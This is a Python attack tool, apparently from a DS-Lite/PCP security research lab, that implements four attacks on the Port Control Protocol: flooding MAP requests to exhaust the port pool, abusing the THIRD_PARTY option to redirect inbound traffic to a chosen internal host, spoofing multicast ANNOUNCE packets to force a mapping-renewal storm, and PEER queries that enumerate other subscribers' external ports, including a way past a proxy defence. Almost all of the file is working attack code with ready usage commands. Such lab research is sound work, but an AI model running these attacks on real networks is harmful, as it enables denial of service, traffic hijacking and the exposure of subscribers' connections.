#!/usr/bin/python
# T7 – PCP Port Exhaustion DoS
# T8 – Unauthorized THIRD_PARTY Forwarding
# T9 – PCP ANNOUNCE Spoofing (epoch reset attack)
# T10 – PCP PEER Abuse (external address enumeration)
#
# PCP (Port Control Protocol, RFC 6887) manages port mappings on the AFTR.
# The DS-Lite lab uses PCP in "plain mode" (draft-ietf-pcp-dslite-00):
#   - PCP client on IPv4 LAN sends MAP request to B4 proxy (UDP/5351)
#   - B4 proxy adds THIRD_PARTY option (internal client IPv4) and forwards
#     to AFTR PCP server over IPv6
#   - AFTR creates nftables DNAT rule and returns external port
#
# RFC 6887 defines three opcodes, all applicable to DS-Lite:
#   MAP      (1) – create/refresh/delete explicit inbound port mappings
#   PEER     (2) – learn/control external IP:port for outbound flows
#   ANNOUNCE (0) – epoch advertisement; clients use for restart recovery
#
# PCP options: THIRD_PARTY (1), PREFER_FAILURE (2), FILTER (3)
#
# Without authentication (RFC 7652), PCP is vulnerable to:
#
#   T7 (exhaust): Flood MAP requests to allocate all available ports (32768-65534)
#                  → legitimate subscribers cannot get port mappings
#
#   T8 (third-party): Create mappings using THIRD_PARTY option for arbitrary
#                  internal IPs → redirect internet traffic to any internal host
#
#   T9 (announce): Spoof unsolicited ANNOUNCE on ISP path (or LAN) to trick
#                  PCP clients into believing the AFTR has restarted → all
#                  clients re-establish mappings, creating DoS or theft window
#
#   T10 (peer): Abuse PEER opcode to enumerate external IP:port assignments of
#               other subscribers → information disclosure for further attacks
#
# Attacker positions:
#   T7/T8/T10: B4 LAN (10.0.x.150) → send to B4 PCP proxy (10.0.x.1:5351)
#   T9:         ISP network (eth-isp) → inject IPv6 PCP
#
# Usage:
#   python3 pcp_attack.py exhaust --proxy-ip 10.0.1.1 --count 5000 --threads 4
#   python3 pcp_attack.py thirdparty --proxy-ip 10.0.1.1 --target-internal 10.0.2.100
#   python3 pcp_attack.py announce --interface eth-isp --aftr-ip6 2001:db8:cafe::10
#   python3 pcp_attack.py peer --proxy-ip 10.0.1.1 --scan-ports 80,443,8080
import argparse
import os
import random
import signal
import socket
import struct
import sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import threading
import time

from validate_parameters import is_valid_ipv4, is_valid_ipv6

def _sigterm_handler(signum, frame):
    raise KeyboardInterrupt()
signal.signal(signal.SIGTERM, _sigterm_handler)

PCP_PORT          = 5351   # RFC 6887 §7.1 — server port (clients send requests here)
PCP_MULTICAST_PORT = 5350  # RFC 6887 §8.5 — client port for unsolicited multicast ANNOUNCE
PCP_VERSION = 2
PCP_OP_ANNOUNCE = 0
PCP_OP_MAP = 1
PCP_OP_PEER = 2

stop_event = threading.Event()
stats_lock = threading.Lock()
stats = {'sent': 0, 'success': 0, 'errors': 0}

# ── PCP packet builder ────────────────────────────────────────────────────

def build_pcp_map_request(nonce, proto, internal_port, ext_port=0,
                           lifetime=3600, third_party_ip4=None):
    """
    Build a PCP MAP request (RFC 6887 Section 11.1).
    Optional THIRD_PARTY option (T8).
    """
    # Client IP: zero-padded IPv4-mapped IPv6 (::ffff:0.0.0.0 for this source)
    client_ipv6 = b'\x00' * 10 + b'\xff\xff' + bytes([0, 0, 0, 0])

    # PCP Common Request Header (24 bytes)
    header = struct.pack(
        '!BBH I 16s',
        PCP_VERSION,    # version = 2
        PCP_OP_MAP,     # opcode = 1 (MAP), R=0 (request)
        0,              # reserved
        lifetime,       # requested lifetime
        client_ipv6     # client IPv6 address
    )

    # MAP opcode-specific info (36 bytes)
    nonce_bytes = nonce if isinstance(nonce, bytes) else struct.pack('!3I', *nonce)
    map_opcode = struct.pack(
        '!12s B 3s HH 16s',
        nonce_bytes[:12],    # mapping nonce (12 bytes)
        proto,               # protocol (6=TCP, 17=UDP)
        b'\x00' * 3,         # reserved
        internal_port,       # internal port
        ext_port,            # suggested external port (0=don't care)
        b'\x00' * 16         # external IP (all zeros = don't care)
    )

    pkt = header + map_opcode

    # THIRD_PARTY option (option code 1, RFC 6887 Section 13.1)
    if third_party_ip4:
        try:
            ip4_bytes = socket.inet_pton(socket.AF_INET, third_party_ip4)
            # IPv4-mapped IPv6: ::ffff:x.x.x.x
            tp_addr = b'\x00' * 10 + b'\xff\xff' + ip4_bytes
        except Exception:
            tp_addr = b'\x00' * 16
        # Option header: code(1B) + reserved(1B) + length(2B) + data
        # RFC 6887 §7.3: length is in octets, THIRD_PARTY data = 16 bytes
        tp_option = struct.pack('!BBH 16s', 1, 0, 16, tp_addr)
        pkt += tp_option

    return pkt


def build_pcp_delete_request(nonce, proto, internal_port, third_party_ip4=None):
    """MAP request with lifetime=0 to delete an existing mapping.

    third_party_ip4 must match the victim's internal IPv4 when sending direct
    to the AFTR (the AFTR server validates nonce+int_ip+int_port).
    """
    return build_pcp_map_request(nonce, proto, internal_port,
                                  lifetime=0,
                                  third_party_ip4=third_party_ip4)


def parse_pcp_response(data):
    """Parse PCP response. Returns (result_code, ext_port, lifetime, ext_ip, nonce) or None."""
    if len(data) < 24:
        return None

    # Response header: version(1)|R|opcode(1)|reserved(1)|result(1)|lifetime(4)|epoch(4)|reserved(12)
    version = data[0]
    r_opcode = data[1]
    result_code = data[3]
    lifetime = struct.unpack('!I', data[4:8])[0]

    r_bit = (r_opcode >> 7) & 1
    opcode = r_opcode & 0x7F

    if not r_bit:
        return None  # not a response

    if opcode == PCP_OP_MAP and len(data) >= 60:
        nonce = data[24:36]
        proto = data[36]
        internal_port = struct.unpack('!H', data[40:42])[0]
        ext_port = struct.unpack('!H', data[42:44])[0]
        ext_ip_bytes = data[44:60]
        try:
            if ext_ip_bytes[:12] == b'\x00' * 10 + b'\xff\xff':
                ext_ip = socket.inet_ntop(socket.AF_INET, ext_ip_bytes[12:])
            else:
                ext_ip = socket.inet_ntop(socket.AF_INET6, ext_ip_bytes)
        except Exception:
            ext_ip = 'unknown'
        return result_code, ext_port, lifetime, ext_ip, nonce

    if opcode == PCP_OP_PEER and len(data) >= 80:
        nonce = data[24:36]
        proto = data[36]
        internal_port = struct.unpack('!H', data[40:42])[0]
        ext_port = struct.unpack('!H', data[42:44])[0]
        ext_ip_bytes = data[44:60]
        remote_port = struct.unpack('!H', data[60:62])[0]
        remote_ip_bytes = data[64:80]
        try:
            if ext_ip_bytes[:12] == b'\x00' * 10 + b'\xff\xff':
                ext_ip = socket.inet_ntop(socket.AF_INET, ext_ip_bytes[12:])
            else:
                ext_ip = socket.inet_ntop(socket.AF_INET6, ext_ip_bytes)
        except Exception:
            ext_ip = 'unknown'
        return result_code, ext_port, lifetime, ext_ip, nonce

    return result_code, 0, lifetime, 'unknown', b''


def send_pcp_request(proxy_ip, pkt, timeout=3):
    """Send PCP request and return raw response or None.

    proxy_ip may be either an IPv4 (B4 PCP proxy, LAN attacker path) or an
    IPv6 address (direct-to-AFTR path, ISP attacker). The socket family is
    selected automatically. When going direct-to-AFTR, the B4 PCP proxy is
    bypassed — so its THIRD_PARTY-stripping defence (b4/pcp_proxy.py) no
    longer applies and the attacker's own THIRD_PARTY option reaches the
    AFTR PCP server verbatim. This is the realistic ISP-side attack path
    for T7/T8/T10.
    """
    is_v6 = ":" in proxy_ip
    fam = socket.AF_INET6 if is_v6 else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        if is_v6:
            s.sendto(pkt, (proxy_ip, PCP_PORT, 0, 0))
        else:
            s.sendto(pkt, (proxy_ip, PCP_PORT))
        data, _ = s.recvfrom(1024)
        return data
    except socket.timeout:
        return None
    except Exception:
        return None
    finally:
        s.close()


# ── T7: PORT EXHAUSTION ──────────────────────────────────────────────────

def worker_exhaust(proxy_ip, proto, count, third_party_prefix=None, idx=0,
                   fire_and_forget=False):
    """Send rapid MAP requests to consume all available ports.

    When the AFTR PCP server processes a MAP request it needs a real IPv4
    internal address to build the DNAT rule. In direct-to-AFTR (ISP) mode
    the server would otherwise fall back to the attacker's IPv6 source —
    which makes nft reject the rule. To reliably consume pool ports we
    pass a THIRD_PARTY option pointing at a per-worker rotating inner
    IPv4 drawn from `third_party_prefix` (e.g. 10.0.0.0/16).

    fire_and_forget: skip response read, keep socket reused — 5×-10× throughput.
    """
    is_v6 = ':' in proxy_ip
    fam = socket.AF_INET6 if is_v6 else socket.AF_INET
    sock = None
    if fire_and_forget:
        sock = socket.socket(fam, socket.SOCK_DGRAM)
        sock.settimeout(0.001)

    for n in range(count):
        if stop_event.is_set():
            break
        nonce = os.urandom(12)
        internal_port = random.randint(1025, 65000)
        third_party_ip4 = None
        if third_party_prefix:
            # Rotate a /16 of inner addresses so nonce+int_ip+int_port is unique
            # and each MAP consumes its own external port.
            seq = (idx * 65535 + n) & 0xFFFF
            third_party_ip4 = f"10.0.{seq >> 8}.{seq & 0xFF}"
        pkt = build_pcp_map_request(nonce, proto, internal_port,
                                     lifetime=7200,
                                     third_party_ip4=third_party_ip4)
        if fire_and_forget:
            try:
                if is_v6:
                    sock.sendto(pkt, (proxy_ip, PCP_PORT, 0, 0))
                else:
                    sock.sendto(pkt, (proxy_ip, PCP_PORT))
                with stats_lock:
                    stats['sent'] += 1
            except Exception:
                with stats_lock:
                    stats['errors'] += 1
            # Drain any stacked responses quickly, non-blocking
            try:
                while True:
                    sock.recv(1024)
            except Exception:
                pass
            continue

        resp = send_pcp_request(proxy_ip, pkt, timeout=1)
        with stats_lock:
            stats['sent'] += 1
            if resp:
                parsed = parse_pcp_response(resp)
                if parsed and parsed[0] == 0:  # SUCCESS
                    stats['success'] += 1
                else:
                    stats['errors'] += 1
            else:
                stats['errors'] += 1


def run_exhaust(args):
    """T7: Flood PCP MAP requests to exhaust port pool."""
    print(f"[*] T7 – PCP Port Exhaustion DoS")
    print(f"[*] Target PCP proxy: {args.proxy_ip}:{PCP_PORT}")
    print(f"[*] Sending {args.count} MAP requests via {args.threads} threads")
    print(f"[*] Protocol: {'TCP' if args.proto == 6 else 'UDP'}")
    print()
    print("[!] PCP port pool is shared with the AFTR's SNAT range (RFC 6056)")
    print("[!] After exhaustion, regular subscriber SNAT also fails (conntrack full)")
    print()


    # Distribute the requested count across the threads, giving the first
    # `rem` threads one extra so the totals add up to exactly args.count.
    # (A plain count // threads dropped the remainder, and any count smaller
    # than the thread count sent nothing at all.)
    base, rem = divmod(args.count, args.threads)
    per_thread_counts = [base + (1 if i < rem else 0) for i in range(args.threads)]
    threads = []
    start = time.time()

    # Direct-to-AFTR (IPv6 proxy_ip) requires a valid IPv4 internal address
    # in the PCP MAP; otherwise the AFTR uses the attacker's IPv6 source
    # address and the resulting DNAT rule is rejected by nft (IPv4 table).
    # In LAN mode (IPv4 proxy_ip) the B4 PCP proxy already injects a valid
    # THIRD_PARTY for its client, so we pass None and let the proxy fill it.
    third_party_prefix = "10.0.0.0/16" if ':' in args.proxy_ip else None

    for worker_idx in range(args.threads):
        if per_thread_counts[worker_idx] == 0:
            continue
        t = threading.Thread(
            target=worker_exhaust,
            args=(args.proxy_ip, args.proto, per_thread_counts[worker_idx],
                  third_party_prefix, worker_idx, args.fire_and_forget),
            daemon=True
        )
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads):
            elapsed = time.time() - start
            with stats_lock:
                print(f"\r  [*] sent={stats['sent']}  "
                      f"success={stats['success']}  "
                      f"errors={stats['errors']}  "
                      f"rate={stats['sent']/max(elapsed,0.1):.0f}/s",
                      end='', flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_event.set()
    for t in threads:
        t.join(timeout=2)

    print(f"\n[+] Done. sent={stats['sent']}  success={stats['success']}")
    print()
    print("Verify on AFTR ns:")
    print("  nft list chain ip nat pcp_dnat | wc -l  # DNAT rules added")
    print("  # Try a legitimate MAP request from client1 – should get NO_RESOURCES")

    print(f"[+] Sent {stats['sent']} PCP MAP requests, {stats['success']} mappings created")


# ── T8: UNAUTHORIZED THIRD_PARTY ────────────────────────────────────────

def run_third_party(args):
    """T8: Create port mapping directing traffic to arbitrary internal IP."""
    print(f"[*] T8 – Unauthorized THIRD_PARTY PCP Forwarding")
    print(f"[*] Target proxy: {args.proxy_ip}:{PCP_PORT}")
    print(f"[*] Target internal host: {args.target_internal}")
    print()
    print("[!] Creating mappings that direct inbound traffic to victim's LAN IP")
    print("[!] No PCP authentication → any client can create mappings for any host")
    print()


    created = []
    for i, port in enumerate(range(args.ext_port_start, args.ext_port_start + args.count)):
        if stop_event.is_set():
            break
        nonce = os.urandom(12)
        internal_port = args.internal_port or random.randint(1025, 65000)

        pkt = build_pcp_map_request(
            nonce, args.proto, internal_port,
            ext_port=0,           # let AFTR choose
            lifetime=7200,
            third_party_ip4=args.target_internal
        )

        resp = send_pcp_request(args.proxy_ip, pkt, timeout=3)
        if resp:
            parsed = parse_pcp_response(resp)
            if parsed and parsed[0] == 0:
                ext_port = parsed[1]
                ext_ip = parsed[3]
                print(f"  [+] Mapping created: {ext_ip}:{ext_port} → "
                      f"{args.target_internal}:{internal_port}")
                created.append((ext_ip, ext_port, args.target_internal, internal_port))
            else:
                rc = parsed[0] if parsed else 'no-response'
                print(f"  [!] Map request failed (result={rc})")
        else:
            print(f"  [!] No response from PCP proxy")

        time.sleep(0.1)

    print()
    print(f"[+] Created {len(created)} THIRD_PARTY mappings")
    if created:
        print("[!] Any traffic to the listed external ports will be forwarded to victim")
        print(f"[!] Victim at {args.target_internal} receives unexpected inbound connections")

    print(f"[+] Created {len(created)} THIRD_PARTY mappings redirecting to {args.target_internal}")
    print("[!] Confirm live: nft list chain ip nat pcp_dnat   (in the aftr netns)")
    return len(created) > 0


# ── T9: ANNOUNCE SPOOFING ────────────────────────────────────────────────

def run_announce_spoof(args):
    """
    T9: Spoof PCP ANNOUNCE on ISP segment to force mapping re-establishment.

    RFC 6887 §14.1: When a PCP server restarts with lost state, it sends an
    unsolicited ANNOUNCE with a new epoch value.  All PCP clients that see
    this ANNOUNCE will believe the NAT lost their mappings and rush to
    re-create them.

    Attack impact:
      1. DoS: All subscribers briefly lose their PCP mappings (inbound ports)
      2. Race: During re-establishment, attacker can create conflicting mappings
         before legitimate clients, hijacking their external ports
      3. Amplification: Single spoofed ANNOUNCE triggers N clients × K requests
    """
    from scapy.layers.inet6 import IPv6, UDP as IPv6UDP
    from scapy.layers.l2 import Ether
    from scapy.sendrecv import sendp

    print(f"[*] T9 – PCP ANNOUNCE Spoofing (epoch reset attack)")
    print(f"[*] Interface: {args.interface}")
    print(f"[*] Spoofing AFTR address: {args.aftr_ip6}")
    print()
    print("[!] Sending spoofed PCP ANNOUNCE responses to multicast ff02::1")
    print("[!] PCP clients will believe AFTR restarted → re-create all mappings")
    print("[!] Creates a mapping-renewal storm during re-establishment")
    print()


    # Build spoofed ANNOUNCE response (RFC 6887 §14.1)
    # Response header: version(1)|0x80|ANNOUNCE(1)|reserved(1)|result=0(1)|
    #                  lifetime=0(4)|epoch=0(4)|reserved(12)
    # Epoch = 0 signals a complete restart (all mappings lost)
    fake_epoch = 0  # epoch reset to zero
    announce_resp = struct.pack(
        '>BBBB I I 12s',
        PCP_VERSION,     # version
        0x80 | PCP_OP_ANNOUNCE,  # R=1 (response), opcode=0 (ANNOUNCE)
        0,               # reserved
        0,               # result = SUCCESS
        0,               # lifetime = 0
        fake_epoch,      # epoch = 0 (fresh restart)
        b'\x00' * 12     # reserved
    )

    # Read our MAC for raw frame send
    try:
        with open(f'/sys/class/net/{args.interface}/address') as f:
            src_mac = f.read().strip()
    except Exception:
        src_mac = "00:00:00:00:00:00"

    sent = 0
    for i in range(args.count):
        if stop_event.is_set():
            break

        pkt = (
            Ether(src=src_mac, dst="33:33:00:00:00:01") /
            IPv6(src=args.aftr_ip6, dst="ff02::1") /
            # RFC 6887 §8.5 — server sends unsolicited multicast ANNOUNCE
            # FROM its server port 5351 TO the client listening port 5350.
            IPv6UDP(sport=PCP_PORT, dport=PCP_MULTICAST_PORT) /
            announce_resp
        )

        try:
            raw_frame = bytes(pkt)
            raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                     socket.htons(0x0003))
            raw_sock.bind((args.interface, 0))
            raw_sock.send(raw_frame)
            raw_sock.close()
            sent += 1
        except Exception as e:
            print(f"  [!] Send error: {e}")
            break

        if i == 0:
            print(f"  [+] First spoofed ANNOUNCE sent (epoch=0, src={args.aftr_ip6})")

        time.sleep(args.interval)

    print()
    print(f"[+] Sent {sent} spoofed ANNOUNCE packets")
    print()
    print("Expected impact:")
    print("  - All PCP clients on segment receive ANNOUNCE with epoch=0")
    print("  - RFC 6887 §14.2: Clients MUST re-create all existing mappings")
    print("  - Re-establishment storm loads the AFTR PCP server")

    print(f"[+] Sent {sent} spoofed ANNOUNCE packets (epoch=0).")


# ── T10: PEER ABUSE ──────────────────────────────────────────────────────

def build_pcp_peer_request(nonce, proto, internal_port,
                            remote_ip, remote_port, lifetime=3600,
                            third_party_ip4=None):
    """Build a PCP PEER request (RFC 6887 §12)."""
    client_ipv6 = b'\x00' * 10 + b'\xff\xff' + bytes([0, 0, 0, 0])

    header = struct.pack(
        '!BBH I 16s',
        PCP_VERSION, PCP_OP_PEER, 0, lifetime, client_ipv6
    )

    nonce_bytes = nonce if isinstance(nonce, bytes) else os.urandom(12)

    # Remote IP as IPv4-mapped
    try:
        remote_ip_bytes = socket.inet_pton(socket.AF_INET, remote_ip)
        remote_ip_raw = b'\x00' * 10 + b'\xff\xff' + remote_ip_bytes
    except Exception:
        remote_ip_raw = b'\x00' * 16

    peer_opcode = struct.pack(
        '!12s B 3s HH 16s H 2s 16s',
        nonce_bytes[:12],
        proto,
        b'\x00' * 3,
        internal_port,
        0,              # suggested ext port (0 = don't care)
        b'\x00' * 16,   # suggested ext IP
        remote_port,
        b'\x00' * 2,    # reserved
        remote_ip_raw,
    )

    pkt = header + peer_opcode

    if third_party_ip4:
        try:
            ip4_bytes = socket.inet_pton(socket.AF_INET, third_party_ip4)
            tp_addr = b'\x00' * 10 + b'\xff\xff' + ip4_bytes
        except Exception:
            tp_addr = b'\x00' * 16
        tp_option = struct.pack('!BBH 16s', 1, 0, 16, tp_addr)
        pkt += tp_option

    return pkt


def run_peer_abuse(args):
    """
    T10: Abuse PEER opcode to enumerate other subscribers' external port mappings.

    RFC 6887 §12: PEER returns the external IP:port assigned by the NAT for
    a given internal flow.  Without PCP authentication (RFC 7652), any LAN
    client can send PEER requests with THIRD_PARTY targeting any internal IP
    and learn their external transport addresses.

    This enables:
      - External port enumeration of other subscribers behind the same AFTR
      - Pre-attack reconnaissance for downstream PCP attacks
      - Information disclosure: subscriber activity visible to attacker
    """
    print(f"[*] T10 – PCP PEER Abuse (external address enumeration)")
    print(f"[*] Target proxy: {args.proxy_ip}:{PCP_PORT}")
    print(f"[*] Target internal: {args.target_internal}")
    print(f"[*] Scanning ports: {args.scan_ports}")
    print()
    print("[!] Using PEER + THIRD_PARTY to learn victim's external mappings")
    print("[!] No PCP authentication → any client can query any host's mappings")
    print()


    ports = []
    for p in args.scan_ports.split(','):
        if '-' in p:
            lo, hi = p.split('-', 1)
            ports.extend(range(int(lo), int(hi) + 1))
        else:
            ports.append(int(p))

    remote_ip = args.remote_ip or "198.51.100.2"
    remote_port = args.remote_port or 80

    discovered = []
    seen_ext = set()
    wildcard_leak = None

    # ── Phase 1: ZERO-KNOWLEDGE wildcard probe ──────────────────────────
    # int_port=0 is a PCP PEER wildcard: the AFTR consults the shared
    # conntrack table for ANY of the THIRD_PARTY-claimed internal IP's flows
    # and returns the NAT-assigned external port of the first match. This
    # discovers an active mapping with NO knowledge of the victim's ephemeral
    # source port — the realistic enumeration primitive (see T10).
    print("[*] wildcard probe (int_port=0) — zero-knowledge mapping discovery")
    wpkt = build_pcp_peer_request(
        os.urandom(12), args.proto, 0, remote_ip, remote_port,
        lifetime=600, third_party_ip4=args.target_internal)
    wresp = send_pcp_request(args.proxy_ip, wpkt, timeout=2)
    if wresp and len(wresp) >= 24:
        wp = parse_pcp_response(wresp)
        if wp and wp[0] == 0 and wp[1] > 0:
            wildcard_leak = wp[1]
            seen_ext.add(wp[1])
            discovered.append((0, wp[3], wp[1]))
            print(f"  [+] wildcard leak: {args.target_internal}:* → "
                  f"{wp[3]}:{wp[1]}  (no port knowledge required)")
    if wildcard_leak is None:
        print("  [ ] wildcard returned no active mapping "
              "(no live flow for target, or AFTR rejected)")

    # ── Phase 2: bounded per-port sweep (completeness) ──────────────────
    # The wildcard returns one flow; to enumerate the full set the attacker
    # probes per source port. The scan list is attacker-knowable (defaults to
    # common service ports; pass an ephemeral range for full enumeration).
    for port in ports:
        if stop_event.is_set():
            break

        nonce = os.urandom(12)
        pkt = build_pcp_peer_request(
            nonce, args.proto, port,
            remote_ip, remote_port,
            lifetime=600,
            third_party_ip4=args.target_internal,
        )

        resp = send_pcp_request(args.proxy_ip, pkt, timeout=2)
        if resp and len(resp) >= 24:
            parsed = parse_pcp_response(resp)
            if parsed:
                result_code = parsed[0]
                ext_port = parsed[1]
                ext_ip = parsed[3]
                if result_code == 0 and ext_port > 0 and ext_port not in seen_ext:
                    print(f"  [+] {args.target_internal}:{port} → "
                          f"{ext_ip}:{ext_port}  (active flow to {remote_ip}:{remote_port})")
                    discovered.append((port, ext_ip, ext_port))
                    seen_ext.add(ext_port)
                elif result_code == 7:  # NETWORK_FAILURE = no flow found
                    pass  # no active flow for this port

        time.sleep(0.05)

    print()
    print(f"[+] Discovered {len(discovered)} active external mappings "
          f"(wildcard leak: {wildcard_leak})")
    if discovered:
        print()
        print("  Discovered mappings (usable for downstream PCP attacks):")
        for int_port, ext_ip, ext_port in discovered:
            print(f"    {args.target_internal}:{int_port} → {ext_ip}:{ext_port}")
        print()
        print("[!] Attacker now knows victim's external ports for targeted attacks")

    print(f"[+] Discovered {len(discovered)} external mappings for {args.target_internal}")
    return len(discovered) > 0


def run_map(args):
    """Create one legitimate PCP MAP (RFC 6887 §11.1).

    This is a benign fixture, not an attack: it establishes a real
    mapping so that other PCP modes have a live victim mapping and PCP MAP
    traffic to work against. It is also a standalone capability check for
    the PCP path.
    """
    nonce = os.urandom(12)
    pkt = build_pcp_map_request(nonce, args.proto, args.internal_port,
                                ext_port=args.ext_port, lifetime=args.lifetime)
    print(f"[*] PCP MAP request: internal_port={args.internal_port} "
          f"proto={args.proto} lifetime={args.lifetime}s "
          f"nonce={nonce.hex()} via {args.proxy_ip}")
    resp = send_pcp_request(args.proxy_ip, pkt, timeout=3)
    ok = False
    ext_port = 0
    if resp:
        parsed = parse_pcp_response(resp)
        if parsed:
            result_code, ext_port, lifetime, ext_ip, _ = parsed
            ok = (result_code == 0 and ext_port > 0)
            if ok:
                print(f"[+] Mapping created: {ext_ip}:{ext_port} "
                      f"(lifetime={lifetime}s)")
            else:
                print(f"[-] MAP refused: result_code={result_code} "
                      f"ext_port={ext_port}")
        else:
            print("[-] Unparseable PCP response")
    else:
        print("[-] No PCP response (timeout)")
    return ok


# ── main ──────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="T7/T8/T9 (+ T10 peer) – PCP Security Attacks\n"
                    "Targets the PCP Port Control Protocol (RFC 6887) in DS-Lite.\n"
                    "RFC 6887 opcodes: MAP(1), PEER(2), ANNOUNCE(0)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sub = p.add_subparsers(dest='mode', required=True)

    # T7
    e = sub.add_parser('exhaust', help='T7: Flood MAP requests to exhaust PCP port pool')
    e.add_argument('--proxy-ip', default='10.0.1.1',
                   help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
    e.add_argument('--count', type=int, default=30000,
                   help='Number of MAP requests (default: 30000 — enough to '
                        'saturate the 64512-port PCP pool with fire-and-forget)')
    e.add_argument('--threads', type=int, default=4,
                   help='Threads (default: 4)')
    e.add_argument('--proto', type=int, default=17, choices=[6, 17],
                   help='IP protocol 6=TCP 17=UDP (default: 17)')
    e.add_argument('--fire-and-forget', action='store_true',
                   help='Skip response wait (5-10x throughput) — recommended '
                        'for direct-to-AFTR pool exhaustion')

    # T8
    tp = sub.add_parser('thirdparty',
                        help='T8: Create THIRD_PARTY mapping for arbitrary internal host')
    tp.add_argument('--proxy-ip', default='10.0.1.1',
                    help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
    tp.add_argument('--target-internal', default='10.0.2.100',
                    help='Internal IPv4 to forward traffic to (default: 10.0.2.100)')
    tp.add_argument('--internal-port', type=int, default=0,
                    help='Target internal port (0=random, default: 0)')
    tp.add_argument('--ext-port-start', type=int, default=0,
                    help='Start of external port suggestion (0=AFTR chooses)')
    tp.add_argument('--count', type=int, default=5,
                    help='Number of mappings to create (default: 5)')
    tp.add_argument('--proto', type=int, default=6, choices=[6, 17],
                    help='IP protocol (default: 6 TCP)')

    # T9
    an = sub.add_parser('announce',
                        help='T9: Spoof PCP ANNOUNCE to force mapping re-establishment')
    an.add_argument('--interface', required=True,
                    help='ISP network interface (e.g. eth-isp)')
    an.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
                    help='AFTR IPv6 to spoof as source (default: 2001:db8:cafe::10)')
    an.add_argument('--count', type=int, default=5,
                    help='Number of spoofed ANNOUNCE packets (default: 5)')
    an.add_argument('--interval', type=float, default=1.0,
                    help='Interval between packets in seconds (default: 1.0)')

    # T10
    pe = sub.add_parser('peer',
                        help='T10: Abuse PEER opcode to enumerate external port mappings')
    pe.add_argument('--proxy-ip', default='10.0.1.1',
                    help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
    pe.add_argument('--target-internal', default='10.0.1.100',
                    help='Internal IPv4 to query mappings for (default: 10.0.1.100)')
    pe.add_argument('--scan-ports', default='80,443,8080,22,53,25,110,143',
                    help='Comma-separated ports or ranges to scan (default: common ports)')
    pe.add_argument('--remote-ip', default='198.51.100.2',
                    help='Remote IP to query flows against (default: 198.51.100.2)')
    pe.add_argument('--remote-port', type=int, default=80,
                    help='Remote port (default: 80)')
    pe.add_argument('--proto', type=int, default=6, choices=[6, 17],
                    help='IP protocol (default: 6 TCP)')

    # MAP fixture (benign): create one legitimate mapping for PCP-path setup
    mp = sub.add_parser('map',
                        help='Create one legitimate PCP MAP (benign PCP-path fixture)')
    mp.add_argument('--proxy-ip', default='10.0.1.1',
                    help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
    mp.add_argument('--internal-port', type=int, default=80,
                    help='Internal port to map (default: 80)')
    mp.add_argument('--ext-port', type=int, default=0,
                    help='Suggested external port (0=AFTR chooses)')
    mp.add_argument('--proto', type=int, default=6, choices=[6, 17],
                    help='IP protocol (default: 6 TCP)')
    mp.add_argument('--lifetime', type=int, default=3600,
                    help='Mapping lifetime in seconds (default: 3600)')

    args = p.parse_args()

    if args.mode in ('exhaust', 'thirdparty', 'peer', 'map'):
        # Accept either IPv4 (B4 proxy path) or IPv6 (direct-to-AFTR path).
        # Direct-to-AFTR bypasses the B4 proxy's THIRD_PARTY-strip defence
        # and is the realistic ISP-side attack path (see paper §5.5).
        if ':' in args.proxy_ip:
            try:
                socket.inet_pton(socket.AF_INET6, args.proxy_ip)
            except Exception:
                p.error(f'Invalid proxy-ip IPv6: {args.proxy_ip}')
        else:
            if not is_valid_ipv4(args.proxy_ip):
                p.error(f'Invalid proxy-ip: {args.proxy_ip}')

    if args.mode == 'exhaust':
        run_exhaust(args)
    elif args.mode == 'thirdparty':
        if not is_valid_ipv4(args.target_internal):
            p.error(f'Invalid target-internal: {args.target_internal}')
        run_third_party(args)
    elif args.mode == 'announce':
        run_announce_spoof(args)
    elif args.mode == 'peer':
        run_peer_abuse(args)
    elif args.mode == 'map':
        run_map(args)
        return



if __name__ == '__main__':
    main()
